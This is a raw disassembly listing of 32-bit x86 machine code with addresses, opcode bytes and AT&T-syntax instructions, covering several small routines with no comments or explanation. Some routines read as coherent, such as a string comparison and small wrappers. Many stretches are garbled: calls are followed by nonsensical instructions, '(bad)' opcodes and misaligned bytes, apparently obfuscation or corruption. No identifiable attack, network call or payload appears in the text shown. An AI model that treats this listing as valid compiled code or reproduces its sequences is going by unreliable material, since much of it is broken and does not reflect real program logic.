  402080:	c2 08 00             	ret    $0x8
  402083:	d3 c0                	rol    %cl,%eax
  402085:	c3                   	ret
  402086:	56                   	push   %esi
  402087:	8b 30                	mov    (%eax),%esi
  402089:	8b 4c b0 4c          	mov    0x4c(%eax,%esi,4),%ecx
  40208d:	8b 54 b0 08          	mov    0x8(%eax,%esi,4),%edx
  402091:	57                   	push   %edi
  402092:	8b 78 04             	mov    0x4(%eax),%edi
  402095:	c1 c9 0d             	ror    $0xd,%ecx
  402098:	03 4c b8 4c          	add    0x4c(%eax,%edi,4),%ecx
  40209c:	c1 ca 05             	ror    $0x5,%edx
  40209f:	03 54 b8 08          	add    0x8(%eax,%edi,4),%edx
  4020a3:	89 4c b0 08          	mov    %ecx,0x8(%eax,%esi,4)
  4020a7:	89 54 b0 4c          	mov    %edx,0x4c(%eax,%esi,4)
  4020ab:	4e                   	dec    %esi
  4020ac:	4f                   	dec    %edi
  4020ad:	85 f6                	test   %esi,%esi
  4020af:	7d 03                	jge    0x4020b4
  4020b1:	6a 10                	push   $0x10
  4020b3:	5e                   	pop    %esi
  4020b4:	85 ff                	test   %edi,%edi
  4020b6:	7d 03                	jge    0x4020bb
  4020b8:	6a 10                	push   $0x10
  4020ba:	5f                   	pop    %edi
  4020bb:	89 30                	mov    %esi,(%eax)
  4020bd:	89 78 04             	mov    %edi,0x4(%eax)
  4020c0:	8b 44 24 0c          	mov    0xc(%esp),%eax
  4020c4:	89 10                	mov    %edx,(%eax)
  4020c6:	8b 44 24 10          	mov    0x10(%esp),%eax
  4020ca:	5f                   	pop    %edi
  4020cb:	89 08                	mov    %ecx,(%eax)
  4020cd:	5e                   	pop    %esi
  4020ce:	c3                   	ret
  4020cf:	56                   	push   %esi
  4020d0:	e8 09 8b 00 00       	call   0x40abde
  4020d5:	37                   	aaa
  4020d6:	60                   	pusha
  4020d7:	e2 57                	loop   0x402130
  4020d9:	3c e8                	cmp    $0xe8,%al
  4020db:	3d 8b 00 00 3f       	cmp    $0x3f00008b,%eax
  4020e0:	8b f0                	mov    %eax,%esi
  4020e2:	e8 6f 8b 00 00       	call   0x40ac56
  4020e7:	27                   	daa
  4020e8:	33 f0                	xor    %eax,%esi
  4020ea:	56                   	push   %esi
  4020eb:	e8 a0 8b 00 00       	call   0x40ac90
  4020f0:	5e                   	pop    %esi
  4020f1:	c3                   	ret
  4020f2:	55                   	push   %ebp
  4020f3:	8b ec                	mov    %esp,%ebp
  4020f5:	51                   	push   %ecx
  4020f6:	51                   	push   %ecx
  4020f7:	e8 05 8a 00 00       	call   0x40ab01
  4020fc:	d3 dc                	rcr    %cl,%esp
  4020fe:	75 05                	jne    0x402105
  402100:	e8 a3 8a 00 00       	call   0x40aba8
  402105:	ff 45 08             	incl   0x8(%ebp)
  402108:	8d 45 fc             	lea    -0x4(%ebp),%eax
  40210b:	50                   	push   %eax
  40210c:	8d 45 f8             	lea    -0x8(%ebp),%eax
  40210f:	50                   	push   %eax
  402110:	e8 27 8a 00 00       	call   0x40ab3c
  402115:	e8 58 8a 00 00       	call   0x40ab72
  40211a:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  40211e:	8b 45 fc             	mov    -0x4(%ebp),%eax
  402121:	59                   	pop    %ecx
  402122:	59                   	pop    %ecx
  402123:	74 05                	je     0x40212a
  402125:	f7 65 08             	mull   0x8(%ebp)
  402128:	8b c2                	mov    %edx,%eax
  40212a:	c9                   	leave
  40212b:	c2 04 00             	ret    $0x4
  40212e:	55                   	push   %ebp
  40212f:	8b ec                	mov    %esp,%ebp
  402131:	51                   	push   %ecx
  402132:	e8 8f 8b 00 00       	call   0x40acc6
  402137:	86 67 75             	xchg   %ah,0x75(%edi)
  40213a:	05 e8 8a 8d 00       	add    $0x8d8ae8,%eax
  40213f:	00 8b 45 08 e8 b9    	add    %cl,-0x4617f7bb(%ebx)
  402145:	8b 00                	mov    (%eax),%eax
  402147:	00 8b d0 e8 e8 8b    	add    %cl,-0x74171730(%ebx)
  40214d:	00 00                	add    %al,(%eax)
  40214f:	8f                   	(bad)
  402150:	33 c0                	xor    %eax,%eax
  402152:	40                   	inc    %eax
  402153:	2b c2                	sub    %edx,%eax
  402155:	89 41 44             	mov    %eax,0x44(%ecx)
  402158:	e8 14 8c 00 00       	call   0x40ad71
  40215d:	9f                   	lahf
  40215e:	33 d2                	xor    %edx,%edx
  402160:	42                   	inc    %edx
  402161:	2b d0                	sub    %eax,%edx
  402163:	8b c2                	mov    %edx,%eax
  402165:	89 01                	mov    %eax,(%ecx)
  402167:	83 c1 04             	add    $0x4,%ecx
  40216a:	e8 3c 8c 00 00       	call   0x40adab
  40216f:	c9                   	leave
  402170:	7c d6                	jl     0x402148
  402172:	e8 6e 8c 00 00       	call   0x40ade5
  402177:	e6 49                	out    %al,$0x49
  402179:	56                   	push   %esi
  40217a:	6a 1f                	push   $0x1f
  40217c:	e8 9f 8c 00 00       	call   0x40ae20
  402181:	e0 63                	loopne 0x4021e6
  402183:	44                   	inc    %esp
  402184:	d7                   	xlat   %ds:(%ebx)
  402185:	28 5e 8d             	sub    %bl,-0x73(%esi)
  402188:	45                   	inc    %ebp
  402189:	08 50 8d             	or     %dl,-0x73(%eax)
  40218c:	45                   	inc    %ebp
  40218d:	fc                   	cld
  40218e:	50                   	push   %eax
  40218f:	e8 ca 8c 00 00       	call   0x40ae5e
  402194:	e8 fb 8c 00 00       	call   0x40ae94
  402199:	4e                   	dec    %esi
  40219a:	59                   	pop    %ecx
  40219b:	59                   	pop    %ecx
  40219c:	75 e9                	jne    0x402187
  40219e:	5e                   	pop    %esi
  40219f:	c9                   	leave
  4021a0:	c2 04 00             	ret    $0x4
  4021a3:	cc                   	int3
  4021a4:	cc                   	int3
  4021a5:	cc                   	int3
  4021a6:	cc                   	int3
  4021a7:	cc                   	int3
  4021a8:	cc                   	int3
  4021a9:	cc                   	int3
  4021aa:	cc                   	int3
  4021ab:	cc                   	int3
  4021ac:	cc                   	int3
  4021ad:	cc                   	int3
  4021ae:	cc                   	int3
  4021af:	cc                   	int3
  4021b0:	6a 00                	push   $0x0
  4021b2:	e8 b0 58 00 00       	call   0x407a67
  4021b7:	6a 00                	push   $0x0
  4021b9:	e8 df 58 00 00       	call   0x407a9d
  4021be:	88 e8                	mov    %ch,%al
  4021c0:	13 59 00             	adc    0x0(%ecx),%ebx
  4021c3:	00 c3                	add    %al,%bl
  4021c5:	cc                   	int3
  4021c6:	cc                   	int3
  4021c7:	cc                   	int3
  4021c8:	cc                   	int3
  4021c9:	cc                   	int3
  4021ca:	cc                   	int3
  4021cb:	cc                   	int3
  4021cc:	cc                   	int3
  4021cd:	cc                   	int3
  4021ce:	cc                   	int3
  4021cf:	cc                   	int3
  4021d0:	c3                   	ret
  4021d1:	cc                   	int3
  4021d2:	cc                   	int3
  4021d3:	cc                   	int3
  4021d4:	cc                   	int3
  4021d5:	cc                   	int3
  4021d6:	cc                   	int3
  4021d7:	cc                   	int3
  4021d8:	cc                   	int3
  4021d9:	cc                   	int3
  4021da:	cc                   	int3
  4021db:	cc                   	int3
  4021dc:	cc                   	int3
  4021dd:	cc                   	int3
  4021de:	cc                   	int3
  4021df:	cc                   	int3
  4021e0:	8b 44 24 04          	mov    0x4(%esp),%eax
  4021e4:	85 c0                	test   %eax,%eax
  4021e6:	7e 12                	jle    0x4021fa
  4021e8:	50                   	push   %eax
  4021e9:	e8 60 85 00 00       	call   0x40a74e
  4021ee:	6a 08                	push   $0x8
  4021f0:	50                   	push   %eax
  4021f1:	e8 8e 85 00 00       	call   0x40a784
  4021f6:	82 c2 04             	add    $0x4,%dl
  4021f9:	00 33                	add    %dh,(%ebx)
  4021fb:	c0 c2 04             	rol    $0x4,%dl
  4021fe:	00 cc                	add    %cl,%ah
  402200:	8b 44 24 04          	mov    0x4(%esp),%eax
  402204:	85 c0                	test   %eax,%eax
  402206:	75 05                	jne    0x40220d
  402208:	e8 49 83 00 00       	call   0x40a556
  40220d:	8b 4c 24 08          	mov    0x8(%esp),%ecx
  402211:	85 c9                	test   %ecx,%ecx
  402213:	75 0b                	jne    0x402220
  402215:	e8 cc 82 00 00       	call   0x40a4e6
  40221a:	e8 fd 82 00 00       	call   0x40a51c
  40221f:	72 8a                	jb     0x4021ab
  402221:	10 3a                	adc    %bh,(%edx)
  402223:	11 75 1a             	adc    %esi,0x1a(%ebp)
  402226:	84 d2                	test   %dl,%dl
  402228:	74 12                	je     0x40223c
  40222a:	8a 50 01             	mov    0x1(%eax),%dl
  40222d:	3a 51 01             	cmp    0x1(%ecx),%dl
  402230:	75 0e                	jne    0x402240
  402232:	83 c0 02             	add    $0x2,%eax
  402235:	83 c1 02             	add    $0x2,%ecx
  402238:	84 d2                	test   %dl,%dl
  40223a:	75 e4                	jne    0x402220
  40223c:	33 c0                	xor    %eax,%eax
  40223e:	eb 05                	jmp    0x402245
  402240:	1b c0                	sbb    %eax,%eax
  402242:	83 d8 ff             	sbb    $0xffffffff,%eax
  402245:	85 c0                	test   %eax,%eax
  402247:	7e 08                	jle    0x402251
  402249:	e8 62 82 00 00       	call   0x40a4b0
  40224e:	c2 08 00             	ret    $0x8
  402251:	33 c9                	xor    %ecx,%ecx
  402253:	85 c0                	test   %eax,%eax
  402255:	0f 9d c1             	setge  %cl
  402258:	83 e9 01             	sub    $0x1,%ecx
  40225b:	8b c1                	mov    %ecx,%eax
  40225d:	c2 08 00             	ret    $0x8
  402260:	8b 44 24 04          	mov    0x4(%esp),%eax
  402264:	8b 0d 78 57 40 00    	mov    0x405778,%ecx
  40226a:	50                   	push   %eax
  40226b:	6a 00                	push   $0x0
  40226d:	51                   	push   %ecx
  40226e:	ff 15 48 52 40 00    	call   *0x405248
  402274:	c2 04 00             	ret    $0x4
  402277:	cc                   	int3
  402278:	cc                   	int3
  402279:	cc                   	int3
  40227a:	cc                   	int3
  40227b:	cc                   	int3
  40227c:	cc                   	int3
  40227d:	cc                   	int3
  40227e:	cc                   	int3
  40227f:	cc                   	int3
  402280:	0f be 00             	movsbl (%eax),%eax
  402283:	c3                   	ret
  402284:	cc                   	int3
  402285:	cc                   	int3
  402286:	cc                   	int3
  402287:	cc                   	int3
  402288:	cc                   	int3
  402289:	cc                   	int3
  40228a:	cc                   	int3
  40228b:	cc                   	int3
  40228c:	cc                   	int3
  40228d:	cc                   	int3
  40228e:	cc                   	int3
  40228f:	cc                   	int3
  402290:	8b 54 24 04          	mov    0x4(%esp),%edx
  402294:	88 10                	mov    %dl,(%eax)
  402296:	c2 04 00             	ret    $0x4
  402299:	cc                   	int3
  40229a:	cc                   	int3
  40229b:	cc                   	int3
  40229c:	cc                   	int3
  40229d:	cc                   	int3
  40229e:	cc                   	int3
  40229f:	cc                   	int3
  4022a0:	51                   	push   %ecx
  4022a1:	56                   	push   %esi
  4022a2:	8b 74 24 0c          	mov    0xc(%esp),%esi
  4022a6:	33 c0                	xor    %eax,%eax
  4022a8:	39 46 14             	cmp    %eax,0x14(%esi)
  4022ab:	89 44 24 04          	mov    %eax,0x4(%esp)
  4022af:	75 24                	jne    0x4022d5
  4022b1:	8b 4e 08             	mov    0x8(%esi),%ecx
  4022b4:	2b 4e 0c             	sub    0xc(%esi),%ecx
  4022b7:	8b 56 04             	mov    0x4(%esi),%edx
  4022ba:	50                   	push   %eax
  4022bb:	8d 44 24 08          	lea    0x8(%esp),%eax
  4022bf:	50                   	push   %eax
  4022c0:	8b 06                	mov    (%esi),%eax
  4022c2:	51                   	push   %ecx
  4022c3:	52                   	push   %edx
  4022c4:	50                   	push   %eax
  4022c5:	e8 d9 72 00 00       	call   0x4095a3
  4022ca:	2f                   	das
  4022cb:	8b 4e 08             	mov    0x8(%esi),%ecx
  4022ce:	8b 44 24 04          	mov    0x4(%esp),%eax
  4022d2:	89 4e 0c             	mov    %ecx,0xc(%esi)
  4022d5:	5e                   	pop    %esi
  4022d6:	59                   	pop    %ecx
  4022d7:	c2 04 00             	ret    $0x4
  4022da:	cc                   	int3
  4022db:	cc                   	int3
  4022dc:	cc                   	int3
  4022dd:	cc                   	int3
  4022de:	cc                   	int3
  4022df:	cc                   	int3
  4022e0:	57                   	push   %edi
  4022e1:	8b 7c 24 08          	mov    0x8(%esp),%edi
  4022e5:	83 ff ff             	cmp    $0xffffffff,%edi
  4022e8:	74 49                	je     0x402333
  4022ea:	e8 54 75 00 00       	call   0x409843
  4022ef:	56                   	push   %esi
  4022f0:	57                   	push   %edi
  4022f1:	50                   	push   %eax
  4022f2:	e8 82 75 00 00       	call   0x409879
  4022f7:	8b f0                	mov    %eax,%esi
  4022f9:	85 f6                	test   %esi,%esi
  4022fb:	74 35                	je     0x402332
  4022fd:	83 7e 04 00          	cmpl   $0x0,0x4(%esi)
  402301:	74 19                	je     0x40231c
  402303:	56                   	push   %esi
  402304:	e8 50 76 00 00       	call   0x409959
  402309:	8b 4e 04             	mov    0x4(%esi),%ecx
  40230c:	e8 7e 76 00 00       	call   0x40998f
  402311:	dc 51 6a             	fcoml  0x6a(%ecx)
  402314:	00 52 e8             	add    %dl,-0x18(%edx)
  402317:	ae                   	scas   %es:(%edi),%al
  402318:	76 00                	jbe    0x40231a
  40231a:	00 63 8b             	add    %ah,-0x75(%ebx)
  40231d:	06                   	push   %es
  40231e:	50                   	push   %eax
  40231f:	e8 8b 75 00 00       	call   0x4098af
  402324:	20 e8                	and    %ch,%al
  402326:	bf 75 00 00 c8       	mov    $0xc8000075,%edi
  40232b:	57                   	push   %edi
  40232c:	51                   	push   %ecx
  40232d:	e8 f1 75 00 00       	call   0x409923
  402332:	5e                   	pop    %esi
  402333:	5f                   	pop    %edi
  402334:	c2 04 00             	ret    $0x4
  402337:	cc                   	int3
  402338:	cc                   	int3
  402339:	cc                   	int3
  40233a:	cc                   	int3
  40233b:	cc                   	int3
  40233c:	cc                   	int3
  40233d:	cc                   	int3
  40233e:	cc                   	int3
  40233f:	cc                   	int3
  402340:	e8 09 a2 00 00       	call   0x40c54e
  402345:	50                   	push   %eax
  402346:	e8 39 a2 00 00       	call   0x40c584
  40234b:	c3                   	ret
  40234c:	cc                   	int3
  40234d:	cc                   	int3
  40234e:	cc                   	int3
  40234f:	cc                   	int3
  402350:	e8 3a 56 00 00       	call   0x40798f
  402355:	6a 10                	push   $0x10
  402357:	6a 18                	push   $0x18
  402359:	e8 67 56 00 00       	call   0x4079c5
  40235e:	e8 98 56 00 00       	call   0x4079fb
  402363:	c3                   	ret
  402364:	cc                   	int3
  402365:	cc                   	int3
  402366:	cc                   	int3
  402367:	cc                   	int3
  402368:	cc                   	int3
  402369:	cc                   	int3
  40236a:	cc                   	int3
  40236b:	cc                   	int3
  40236c:	cc                   	int3
  40236d:	cc                   	int3
  40236e:	cc                   	int3
  40236f:	cc                   	int3
  402370:	51                   	push   %ecx
  402371:	53                   	push   %ebx
  402372:	55                   	push   %ebp
  402373:	56                   	push   %esi
  402374:	57                   	push   %edi
  402375:	8b f0                	mov    %eax,%esi
  402377:	8b 44 24 18          	mov    0x18(%esp),%eax
  40237b:	8b d9                	mov    %ecx,%ebx
  40237d:	e8 44 6a 00 00       	call   0x408dc6
  402382:	52                   	push   %edx
  402383:	50                   	push   %eax
  402384:	51                   	push   %ecx
  402385:	e8 76 6a 00 00       	call   0x408e00
  40238a:	83 fe 01             	cmp    $0x1,%esi
  40238d:	8b f8                	mov    %eax,%edi
  40238f:	75 1c                	jne    0x4023ad
  402391:	6a 00                	push   $0x0
  402393:	e8 15 70 00 00       	call   0x4093ad
  402398:	6a 03                	push   $0x3
  40239a:	6a 00                	push   $0x0
  40239c:	56                   	push   %esi
  40239d:	e8 41 70 00 00       	call   0x4093e3
  4023a2:	53                   	push   %ebx
  4023a3:	e8 71 70 00 00       	call   0x409419
  4023a8:	96                   	xchg   %eax,%esi
  4023a9:	8b f0                	mov    %eax,%esi
  4023ab:	eb 63                	jmp    0x402410
  4023ad:	83 fe 02             	cmp    $0x2,%esi
  4023b0:	75 1d                	jne    0x4023cf
  4023b2:	6a 00                	push   $0x0
  4023b4:	e8 4e 6f 00 00       	call   0x409307
  4023b9:	6a 04                	push   $0x4
  4023bb:	6a 00                	push   $0x0
  4023bd:	6a 01                	push   $0x1
  4023bf:	e8 79 6f 00 00       	call   0x40933d
  4023c4:	53                   	push   %ebx
  4023c5:	e8 a9 6f 00 00       	call   0x409373
  4023ca:	02 8b f0 eb 41 83    	add    -0x7cbe1410(%ebx),%cl
  4023d0:	fe 03                	incb   (%ebx)
  4023d2:	75 38                	jne    0x40240c
  4023d4:	e8 52 6e 00 00       	call   0x40922b
  4023d9:	ae                   	scas   %es:(%edi),%al
  4023da:	6a 00                	push   $0x0
  4023dc:	e8 84 6e 00 00       	call   0x409265
  4023e1:	6a 02                	push   $0x2
  4023e3:	6a 00                	push   $0x0
  4023e5:	6a 01                	push   $0x1
  4023e7:	e8 af 6e 00 00       	call   0x40929b
  4023ec:	53                   	push   %ebx
  4023ed:	ff d5                	call   *%ebp
  4023ef:	8b f0                	mov    %eax,%esi
  4023f1:	83 fe ff             	cmp    $0xffffffff,%esi
  4023f4:	75 1f                	jne    0x402415
  4023f6:	6a 00                	push   $0x0
  4023f8:	6a 00                	push   $0x0
  4023fa:	6a 05                	push   $0x5
  4023fc:	6a 00                	push   $0x0
  4023fe:	6a 01                	push   $0x1
  402400:	e8 cc 6e 00 00       	call   0x4092d1
  402405:	53                   	push   %ebx
  402406:	ff d5                	call   *%ebp
  402408:	8b f0                	mov    %eax,%esi
  40240a:	eb 04                	jmp    0x402410
  40240c:	8b 74 24 10          	mov    0x10(%esp),%esi
  402410:	83 fe ff             	cmp    $0xffffffff,%esi
  402413:	74 51                	je     0x402466
  402415:	33 db                	xor    %ebx,%ebx
  402417:	3b f3                	cmp    %ebx,%esi
  402419:	74 4b                	je     0x402466
  40241b:	e8 ba 6c 00 00       	call   0x4090da
  402420:	3b c3                	cmp    %ebx,%eax
  402422:	74 14                	je     0x402438
  402424:	e8 8e 6d 00 00       	call   0x4091b7
  402429:	cc                   	int3
  40242a:	50                   	push   %eax
  40242b:	53                   	push   %ebx
  40242c:	52                   	push   %edx
  40242d:	e8 bf 6d 00 00       	call   0x4091f1
  402432:	f8                   	clc
  402433:	89 47 04             	mov    %eax,0x4(%edi)
  402436:	eb 03                	jmp    0x40243b
  402438:	89 5f 04             	mov    %ebx,0x4(%edi)
  40243b:	e8 d0 6c 00 00       	call   0x409110
  402440:	89 37                	mov    %esi,(%edi)
  402442:	e8 ff 6c 00 00       	call   0x409146
  402447:	89 47 08             	mov    %eax,0x8(%edi)
  40244a:	89 5f 0c             	mov    %ebx,0xc(%edi)
  40244d:	e8 2a 6d 00 00       	call   0x40917c
  402452:	82 53 75 08          	adcb   $0x8,0x75(%ebx)
  402456:	8b c7                	mov    %edi,%eax
  402458:	5f                   	pop    %edi
  402459:	5e                   	pop    %esi
  40245a:	5d                   	pop    %ebp
  40245b:	5b                   	pop    %ebx
  40245c:	59                   	pop    %ecx
  40245d:	c3                   	ret
  40245e:	5f                   	pop    %edi
  40245f:	8b c6                	mov    %esi,%eax
  402461:	5e                   	pop    %esi
  402462:	5d                   	pop    %ebp
  402463:	5b                   	pop    %ebx
  402464:	59                   	pop    %ecx
  402465:	c3                   	ret
  402466:	e8 e9 6a 00 00       	call   0x408f54
  40246b:	75 0d                	jne    0x40247a
  40246d:	e8 18 6b 00 00       	call   0x408f8a
  402472:	15 57 51 e8 4a       	adc    $0x4ae85157,%eax
  402477:	6b 00 00             	imul   $0x0,(%eax),%eax
  40247a:	5f                   	pop    %edi
  40247b:	5e                   	pop    %esi
  40247c:	5d                   	pop    %ebp
  40247d:	33 c0                	xor    %eax,%eax
  40247f:	5b                   	pop    %ebx
  402480:	59                   	pop    %ecx
  402481:	c3                   	ret
  402482:	cc                   	int3
  402483:	cc                   	int3
  402484:	cc                   	int3
  402485:	cc                   	int3
  402486:	cc                   	int3
  402487:	cc                   	int3
  402488:	cc                   	int3
  402489:	cc                   	int3
  40248a:	cc                   	int3
  40248b:	cc                   	int3
  40248c:	cc                   	int3
  40248d:	cc                   	int3
  40248e:	cc                   	int3
  40248f:	cc                   	int3
  402490:	8b 44 24 04          	mov    0x4(%esp),%eax
  402494:	8b 4c 24 08          	mov    0x8(%esp),%ecx
  402498:	50                   	push   %eax
  402499:	e8 b8 8c 00 00       	call   0x40b156
  40249e:	e8 e9 8c 00 00       	call   0x40b18c
  4024a3:	83 c4 04             	add    $0x4,%esp
  4024a6:	c2 08 00             	ret    $0x8
  4024a9:	cc                   	int3
  4024aa:	cc                   	int3
  4024ab:	cc                   	int3
  4024ac:	cc                   	int3
  4024ad:	cc                   	int3
  4024ae:	cc                   	int3
  4024af:	cc                   	int3
  4024b0:	8b 44 24 04          	mov    0x4(%esp),%eax
  4024b4:	8b 4c 24 08          	mov    0x8(%esp),%ecx
  4024b8:	50                   	push   %eax
  4024b9:	e8 9c 68 00 00       	call   0x408d5a
  4024be:	e8 cd 68 00 00       	call   0x408d90
  4024c3:	83 c4 04             	add    $0x4,%esp
  4024c6:	c2 08 00             	ret    $0x8
  4024c9:	cc                   	int3
  4024ca:	cc                   	int3
  4024cb:	cc                   	int3
  4024cc:	cc                   	int3
  4024cd:	cc                   	int3
  4024ce:	cc                   	int3
  4024cf:	cc                   	int3
  4024d0:	8b 44 24 04          	mov    0x4(%esp),%eax
  4024d4:	e8 ea 6f 00 00       	call   0x4094c3
  4024d9:	b3 53                	mov    $0x53,%bl
  4024db:	56                   	push   %esi
  4024dc:	57                   	push   %edi
  4024dd:	50                   	push   %eax
  4024de:	83 cf ff             	or     $0xffffffff,%edi
  4024e1:	51                   	push   %ecx
  4024e2:	0b df                	or     %edi,%ebx
  4024e4:	e8 14 70 00 00       	call   0x4094fd
  4024e9:	8b f0                	mov    %eax,%esi
  4024eb:	85 f6                	test   %esi,%esi
  4024ed:	74 32                	je     0x402521
  4024ef:	83 7e 04 00          	cmpl   $0x0,0x4(%esi)
  4024f3:	74 0c                	je     0x402501
  4024f5:	83 7e 14 00          	cmpl   $0x0,0x14(%esi)
  4024f9:	75 06                	jne    0x402501
  4024fb:	56                   	push   %esi
  4024fc:	e8 6c 70 00 00       	call   0x40956d
  402501:	8b 06                	mov    (%esi),%eax
  402503:	8d 54 24 10          	lea    0x10(%esp),%edx
  402507:	52                   	push   %edx
  402508:	50                   	push   %eax
  402509:	e8 25 70 00 00       	call   0x409533
  40250e:	f2 8b 74 24 10       	repnz mov 0x10(%esp),%esi
  402513:	33 c9                	xor    %ecx,%ecx
  402515:	33 d2                	xor    %edx,%edx
  402517:	5f                   	pop    %edi
  402518:	0b c1                	or     %ecx,%eax
  40251a:	0b d6                	or     %esi,%edx
  40251c:	5e                   	pop    %esi
  40251d:	5b                   	pop    %ebx
  40251e:	c2 04 00             	ret    $0x4
  402521:	8b c7                	mov    %edi,%eax
  402523:	5f                   	pop    %edi
  402524:	5e                   	pop    %esi
  402525:	8b d3                	mov    %ebx,%edx
  402527:	5b                   	pop    %ebx
  402528:	c2 04 00             	ret    $0x4
  40252b:	cc                   	int3
  40252c:	cc                   	int3
  40252d:	cc                   	int3
  40252e:	cc                   	int3
  40252f:	cc                   	int3
  402530:	51                   	push   %ecx
  402531:	8b 44 24 08          	mov    0x8(%esp),%eax
  402535:	e8 c1 79 00 00       	call   0x409efb
  40253a:	72 50                	jb     0x40258c
  40253c:	51                   	push   %ecx
  40253d:	e8 f3 79 00 00       	call   0x409f35
  402542:	c4 c2 7a e8          	(bad)
  402546:	27                   	daa
  402547:	7a 00                	jp     0x402549
  402549:	00 85 c0 74 34 83    	add    %al,-0x7ccb8b40(%ebp)
  40254f:	78 04                	js     0x402555
  402551:	00 74 14 8b          	add    %dh,-0x75(%esp,%edx,1)
  402555:	54                   	push   %esp
  402556:	24 10                	and    $0x10,%al
  402558:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
  40255c:	52                   	push   %edx
  40255d:	51                   	push   %ecx
  40255e:	50                   	push   %eax
  40255f:	e8 7d 7a 00 00       	call   0x409fe1
  402564:	59                   	pop    %ecx
  402565:	c2 0c 00             	ret    $0xc
  402568:	8b 4c 24 10          	mov    0x10(%esp),%ecx
  40256c:	8b 00                	mov    (%eax),%eax
  40256e:	6a 00                	push   $0x0
  402570:	8d 54 24 04          	lea    0x4(%esp),%edx
  402574:	52                   	push   %edx
  402575:	8b 54 24 14          	mov    0x14(%esp),%edx
  402579:	51                   	push   %ecx
  40257a:	52                   	push   %edx
  40257b:	50                   	push   %eax
  40257c:	e8 26 7a 00 00       	call   0x409fa7
  402581:	25 8b 04 24 59       	and    $0x5924048b,%eax
  402586:	c2 0c 00             	ret    $0xc
  402589:	cc                   	int3
  40258a:	cc                   	int3
  40258b:	cc                   	int3
  40258c:	cc                   	int3
  40258d:	cc                   	int3
  40258e:	cc                   	int3
  40258f:	cc                   	int3
  402590:	51                   	push   %ecx
  402591:	57                   	push   %edi
  402592:	8b 7c 24 10          	mov    0x10(%esp),%edi
  402596:	33 c0                	xor    %eax,%eax
  402598:	85 ff                	test   %edi,%edi
  40259a:	89 44 24 04          	mov    %eax,0x4(%esp)
  40259e:	74 49                	je     0x4025e9
  4025a0:	56                   	push   %esi
  4025a1:	8b 74 24 18          	mov    0x18(%esp),%esi
  4025a5:	85 f6                	test   %esi,%esi
  4025a7:	74 3f                	je     0x4025e8
  4025a9:	8b 44 24 10          	mov    0x10(%esp),%eax
  4025ad:	e8 7c 8c 00 00       	call   0x40b22e
  4025b2:	3a 50 51             	cmp    0x51(%eax),%dl
  4025b5:	e8 ae 8c 00 00       	call   0x40b268
  4025ba:	85 c0                	test   %eax,%eax
  4025bc:	74 26                	je     0x4025e4
  4025be:	83 78 04 00          	cmpl   $0x0,0x4(%eax)
  4025c2:	74 0e                	je     0x4025d2
  4025c4:	56                   	push   %esi
  4025c5:	57                   	push   %edi
  4025c6:	50                   	push   %eax
  4025c7:	e8 0c 8d 00 00       	call   0x40b2d8
  4025cc:	5e                   	pop    %esi
  4025cd:	5f                   	pop    %edi
  4025ce:	59                   	pop    %ecx
  4025cf:	c2 0c 00             	ret    $0xc
  4025d2:	8b 00                	mov    (%eax),%eax
  4025d4:	6a 00                	push   $0x0
  4025d6:	8d 54 24 0c          	lea    0xc(%esp),%edx
  4025da:	52                   	push   %edx
  4025db:	56                   	push   %esi
  4025dc:	57                   	push   %edi
  4025dd:	50                   	push   %eax
  4025de:	e8 bb 8c 00 00       	call   0x40b29e
  4025e3:	68 8b 44 24 08       	push   $0x824448b
  4025e8:	5e                   	pop    %esi
  4025e9:	5f                   	pop    %edi
  4025ea:	59                   	pop    %ecx
  4025eb:	c2 0c 00             	ret    $0xc
  4025ee:	cc                   	int3
  4025ef:	cc                   	int3
  4025f0:	8b 44 24 04          	mov    0x4(%esp),%eax
  4025f4:	e8 40 74 00 00       	call   0x409a39
  4025f9:	96                   	xchg   %eax,%esi
  4025fa:	56                   	push   %esi
  4025fb:	50                   	push   %eax
  4025fc:	51                   	push   %ecx
  4025fd:	e8 71 74 00 00       	call   0x409a73
  402602:	8b f0                	mov    %eax,%esi
  402604:	85 f6                	test   %esi,%esi
  402606:	74 2f                	je     0x402637
  402608:	83 7e 04 00          	cmpl   $0x0,0x4(%esi)
  40260c:	74 14                	je     0x402622
  40260e:	56                   	push   %esi
  40260f:	e8 cf 74 00 00       	call   0x409ae3
  402614:	e8 00 75 00 00       	call   0x409b19
  402619:	1a df                	sbb    %bh,%bl
  40261b:	e8 34 75 00 00       	call   0x409b54
  402620:	dd 5b 8b             	fstpl  -0x75(%ebx)
  402623:	44                   	inc    %esp
  402624:	24 0c                	and    $0xc,%al
  402626:	8b 0e                	mov    (%esi),%ecx
  402628:	6a 00                	push   $0x0
  40262a:	8d 54 24 14          	lea    0x14(%esp),%edx
  40262e:	52                   	push   %edx
  40262f:	50                   	push   %eax
  402630:	51                   	push   %ecx
  402631:	e8 73 74 00 00       	call   0x409aa9
  402636:	c5 5e c2             	lds    -0x3e(%esi),%ebx
  402639:	0c 00                	or     $0x0,%al
  40263b:	cc                   	int3
  40263c:	cc                   	int3
  40263d:	cc                   	int3
  40263e:	cc                   	int3
  40263f:	cc                   	int3
  402640:	83 ec 08             	sub    $0x8,%esp
  402643:	8b 44 24 0c          	mov    0xc(%esp),%eax
  402647:	8b 0d 7c 57 40 00    	mov    0x40577c,%ecx
  40264d:	56                   	push   %esi
  40264e:	50                   	push   %eax
  40264f:	51                   	push   %ecx
  402650:	c7 44 24 0c 00 00 00 	movl   $0x0,0xc(%esp)
  402657:	00 
  402658:	e8 9e 0d 00 00       	call   0x4033fb
  40265d:	8b f0                	mov    %eax,%esi
  40265f:	85 f6                	test   %esi,%esi
  402661:	74 61                	je     0x4026c4
  402663:	83 7e 04 00          	cmpl   $0x0,0x4(%esi)
  402667:	74 2a                	je     0x402693
  402669:	6a 01                	push   $0x1
  40266b:	8d 54 24 08          	lea    0x8(%esp),%edx
  40266f:	52                   	push   %edx
  402670:	56                   	push   %esi
  402671:	e8 1a 01 00 00       	call   0x402790
  402676:	85 c0                	test   %eax,%eax
  402678:	74 0d                	je     0x402687
  40267a:	83 46 0c 01          	addl   $0x1,0xc(%esi)
  40267e:	33 c0                	xor    %eax,%eax
  402680:	5e                   	pop    %esi
  402681:	83 c4 08             	add    $0x8,%esp
  402684:	c2 04 00             	ret    $0x4
  402687:	b8 01 00 00 00       	mov    $0x1,%eax
  40268c:	5e                   	pop    %esi
  40268d:	83 c4 08             	add    $0x8,%esp
  402690:	c2 04 00             	ret    $0x4
  402693:	8b 16                	mov    (%esi),%edx
  402695:	6a 00                	push   $0x0
  402697:	8d 44 24 0c          	lea    0xc(%esp),%eax
  40269b:	50                   	push   %eax
